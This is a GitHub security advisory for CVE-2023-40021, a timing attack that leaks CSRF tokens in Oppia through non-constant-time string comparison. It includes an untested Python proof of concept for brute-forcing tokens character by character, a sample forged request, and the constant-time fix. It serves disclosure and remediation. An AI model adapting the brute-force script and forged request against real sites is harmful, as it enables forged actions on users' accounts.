
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Foppia%2Foppia%2Fsecurity%2Fadvisories%2FGHSA-49jp-pjc3-2532)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Foppia%2Foppia%2Fsecurity%2Fadvisories%2FGHSA-49jp-pjc3-2532)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=oppia%2Foppia)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[oppia](/oppia)
/
**[oppia](/oppia/oppia)**
Public

* [Notifications](/login?return_to=%2Foppia%2Foppia) You must be signed in to change notification settings
* [Fork
  4.3k](/login?return_to=%2Foppia%2Foppia)
* [Star
   5.9k](/login?return_to=%2Foppia%2Foppia)

* [Code](/oppia/oppia)
* [Issues
  1.4k](/oppia/oppia/issues)
* [Pull requests
  38](/oppia/oppia/pulls)
* [Discussions](/oppia/oppia/discussions)
* [Actions](/oppia/oppia/actions)
* [Projects
  6](/oppia/oppia/projects)
* [Wiki](/oppia/oppia/wiki)
* [Security](/oppia/oppia/security)
* [Insights](/oppia/oppia/pulse)

Additional navigation options

* [Code](/oppia/oppia)
* [Issues](/oppia/oppia/issues)
* [Pull requests](/oppia/oppia/pulls)
* [Discussions](/oppia/oppia/discussions)
* [Actions](/oppia/oppia/actions)
* [Projects](/oppia/oppia/projects)
* [Wiki](/oppia/oppia/wiki)
* [Security](/oppia/oppia/security)
* [Insights](/oppia/oppia/pulse)

# CVE-2023-40021: Timing Attack Reveals CSRF Tokens

Moderate

[seanlip](/seanlip)
published
GHSA-49jp-pjc3-2532
Aug 16, 2023

## Package

oppia/oppia
(GitHub)

## Affected versions

1.1.0 - 3.3.2

## Patched versions

3.3.2-hotfix-2

## Description

## Vulnerability Report

### Summary

When comparing a received CSRF token against the expected token, Oppia uses the string equality operator (`==`), which is not safe against timing attacks. By repeatedly submitting invalid tokens, an attacker can brute-force the expected CSRF token character by character. Once they have recovered the token, they can then submit a forged request on behalf of a logged-in user and execute privileged actions on that user's behalf.

### Details

The function to validate received CSRF tokens is at `oppia.core.controllers.base.CsrfTokenManager.is_csrf_token_valid`:

[oppia/core/controllers/base.py](https://github.com/oppia/oppia/blob/3a05c3558a292f3db9e658e60e708c266c003fd0/core/controllers/base.py#L964-L990)

Lines 964 to 990
in
[3a05c35](/oppia/oppia/commit/3a05c3558a292f3db9e658e60e708c266c003fd0)

|  | def is\_csrf\_token\_valid(cls, user\_id: Optional[str], token: str) -> bool: |
| --- | --- |
|  | """Validates a given CSRF token. |
|  |  |
|  | Args: |
|  | user\_id: str|None. The user\_id to validate the CSRF token against. |
|  | token: str. The CSRF token to validate. |
|  |  |
|  | Returns: |
|  | bool. Whether the given CSRF token is valid. |
|  | """ |
|  | try: |
|  | parts = token.split('/') |
|  | if len(parts) != 2: |
|  | return False |
|  |  |
|  | issued\_on = int(parts[0]) |
|  | age = cls.\_get\_current\_time() - issued\_on |
|  | if age > cls.\_CSRF\_TOKEN\_AGE\_SECS: |
|  | return False |
|  |  |
|  | authentic\_token = cls.\_create\_token(user\_id, issued\_on) |
|  | if authentic\_token == token: |
|  | return True |
|  |  |
|  | return False |
|  | except Exception: |
|  | return False |

The vulnerability is here:

[oppia/core/controllers/base.py](https://github.com/oppia/oppia/blob/3a05c3558a292f3db9e658e60e708c266c003fd0/core/controllers/base.py#L985)

Line 985
in
[3a05c35](/oppia/oppia/commit/3a05c3558a292f3db9e658e60e708c266c003fd0)

|  | if authentic\_token == token: |
| --- | --- |

In CPython, the equality operator on unicode objects uses `memcmp` to compare the objects' values (see [`Objects/unicodeobject.c`](https://github.com/python/cpython/blob/2e27da18952c6561f48dab706b5911135cedd7cf/Objects/unicodeobject.c#L10602C14-L10602C14) in the CPython repo):

```
static int
unicode_compare_eq(PyObject *str1, PyObject *str2)
{
    int kind;
    const void *data1, *data2;
    Py_ssize_t len;
    int cmp;

    len = PyUnicode_GET_LENGTH(str1);
    if (PyUnicode_GET_LENGTH(str2) != len)
        return 0;
    kind = PyUnicode_KIND(str1);
    if (PyUnicode_KIND(str2) != kind)
        return 0;
    data1 = PyUnicode_DATA(str1);
    data2 = PyUnicode_DATA(str2);

    cmp = memcmp(data1, data2, len * kind);
    return (cmp == 0);
}
```

Here is an example implementation of memcmp from gcc (from [`libgcc/memcmp.c`](https://gcc.gnu.org/git/?p=gcc.git;a=blob;f=libgcc/memcmp.c;h=2348afe1d27f7101adaa1970ee7f040e2343f35c;hb=HEAD) in the gcc repo):

```
int
memcmp (const void *str1, const void *str2, size_t count)
{
  const unsigned char *s1 = str1;
  const unsigned char *s2 = str2;

  while (count-- > 0)
    {
      if (*s1++ != *s2++)
	  return s1[-1] < s2[-1] ? -1 : 1;
    }
  return 0;
}
```

Notice that this function is not constant-time; that is, if `str1` and `str2` have their first difference at an earlier index, the function will terminate sooner. This means that if the received CSRF token and the expected one differ at an earlier index, the `is_csrf_token_valid()` function will terminate sooner, which leaks sensitive information to an attacker. For details on how an attacker can abuse this information, see the PoC below.

### PoC

*Note: I have not tested this PoC. I am including it as an example of how this vulnerability could be abused to make the potential attack clear.*

**Prerequisites:** To pull off this attack, an attacker needs a user to be logged-in to Oppia and have an attacker-controlled website open at the same time.

**Attack:** The attacker-controlled website issues requests to a protected Oppia endpoint, for example a PUT request to <https://www.oppiatestserver.org/preferenceshandler/data> to change the user's bio with the following payload:

```
{
  "payload": {"update_type": "user_bio", "data": "testing"},
  "csrf_token": "1691808272/GONUjFmtQN0DkHt67ucdZw==",
  "source": "https://www.oppiatestserver.org/preferences"
}
```

Note that the CSRF token could be generated like this:

```
>>> import base64
>>> import hmac
>>> import time
>>> digest = base64.urlsafe_b64encode(hmac.digest(b'key', b'msg', digest='md5')).decode('utf-8')
>>> timestamp = time.time()
>>> print(f'{timestamp}/{digest}')
1691808272/GONUjFmtQN0DkHt67ucdZw==
```

Since the user is logged-in to Oppia, their valid session cookie will be sent along with the request, making it appear that the request came from an authorized user. However, the CSRF token will be invalid (here and elsewhere, I'm ignoring the negligible possibility of 128-bit collisions). The attacker needs to guess the 128-bit digest portion of the token, which is normally impossible. However, in this case, they can take advantage of the timing vulnerability discussed above. Here's how the attack might work (code is in Python for clarity, but to run on the attacker-controlled website, this would be implemented in JavaScript):

```
import time
import numpy as np

# Defined in RFC 4648, section 5: https://datatracker.ietf.org/doc/html/rfc4648.html#section-5
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
# How many trials to average timing measurements over. Averaging removes noise from network latency.
TRIALS = 5

# A base64-encoded MD5 hash is always 22 characters from ALPHABET, followed by two padding characters.
# This is because an MD5 hash is 128 bits. Each Base64 character provides log2(64)=6 bits of information,
# so we need ceil(128/6)=22 Base64 characters to encode the hash. Then 2 padding characters get added
# because Base64 encodes every 3 bytes as 4-character chunks, so the length of the base64 string needs to
# be a multiple of 4. Source: https://stackoverflow.com/a/13296298.
guess = ALPHABET[0] * 22 + '=='
for known_chars in range(22):
    avg_times = []
    for char in ALPHABET:
        guess[known_chars] = char
        total_time = 0
        for _ in range(TRIALS):
            start = time.time()
            # Suppose we have a submit_request() function that takes a time and a guess,
            # crafts the request, and sends it.
            submit_request(start, guess)
            end = time.time()
            total_time += (end - start)
        avg_times.append(total_time / TRIALS)
    # With the correct guess, the submitted and expected tokens shared a longer prefix, so rejection took longer.
    guess[known_chars] = ALPHABET[np.argmax(avg_times)]
```

Sometime in the last iteration of the outer loop (and possibly earlier if the attacker got lucky), the guess was correct and the request was accepted by the server, completing the attack.

**Caveats:** This attack has to complete within 1 second because every second, the time used in computing the token changes. The attacker then has to start their brute-forcing from scratch. However, the attacker only needs to submit 22(64)5=7,040 requests within this second, which while not trivial, is feasible. Further, an attacker will in expectation hit the correct token after submitting only half as many requests, may be able to optimize the brute-forcing logic to use fewer trials, and can run this attack against many users so that even a low probability of guessing the token leads to at least some successful attacks.

### Suggested Remediation

**Essential:** The expected and received CSRF tokens should be compared using [`hmac.compare_digest()`](https://docs.python.org/3/library/hmac.html#hmac.compare_digest) instead, which is constant-time. The new code would look like this:

```
            if hmac.compare_digest(authentic_token, token):
```

Note that `compare_digest` only accepts either two ASCII-only `str` objects or two `bytes` objects.

**Suggested:**

1. Instead of computing the HMAC with MD5, use SHA256. While the attacks on MD5 so far do not compromise the security of an HMAC, it would be prudent to move away from MD5 since attacks will likely get better over time.
2. CSRF tokens should ideally be scoped to user sessions, but Oppia currently leaves them valid for 48 hours. This means that when a user logs out and logs back in, a CSRF token from the previous session could still be valid, which is not ideal. I don't see any attacks that this would allow, but session-scoped CSRF tokens are a common best practice (see OWASP link below).
3. CSRF tokens should include a nonce, not just a timestamp, to ensure that consecutive calls in the same second produce different tokens. Again, this is more of a best-practice thing (see OWASP link below) than a protection against an attack (at least that I can see).

Further reading:

* OWASP guide to CSRF, specifically the signed double-submit cookie scheme, which is essentially what Oppia tries to do: <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#signed-double-submit-cookie>
* An early example of how timing attacks can work over a network: <https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf>

### Impact

An attacker who can lure a logged-in Oppia user to a malicious website can perform any change on Oppia that the user is authorized to do, including changing profile information; creating, deleting, and changing explorations; etc. Note that the attacker *cannot* change a user's login credentials since those are managed by Google, which (hopefully) has its own CSRF protections.

## Remediation

The essential remediation and suggested remediations 1 and 3 were implemented in [#18769](https://github.com/oppia/oppia/pull/18769), which was merged in commit [b89bf80](https://github.com/oppia/oppia/commit/b89bf808378c1236874b5797a7bda32c77b4af23). This commit will be deployed to production as part of May 2023 hotfix 2.

## Timeline

* Reported: 2023-08-11
* CVE CVE-2023-40021 assigned: 2023-08-14
* Remediated:
  + Remediation Merged: 2023-08-12
  + Remediation Deployed: 2023-08-14 (in May 2023 hotfix 2)
* Disclosed: 2023-08-16

### Severity

Moderate

5.3

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
High

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
None

Integrity
High

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N

### CVE ID

CVE-2023-40021

### Weaknesses

[CWE-208](/advisories?query=cwe%3A208)

### Credits

* [![@U8NWXD](https://avatars.githubusercontent.com/u/19878639?s=40&v=4)](/U8NWXD)
  [U8NWXD](/U8NWXD)
  Reporter
* [![@seanlip](https://avatars.githubusercontent.com/u/10575562?s=40&v=4)](/seanlip)
  [seanlip](/seanlip)
  Coordinator

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

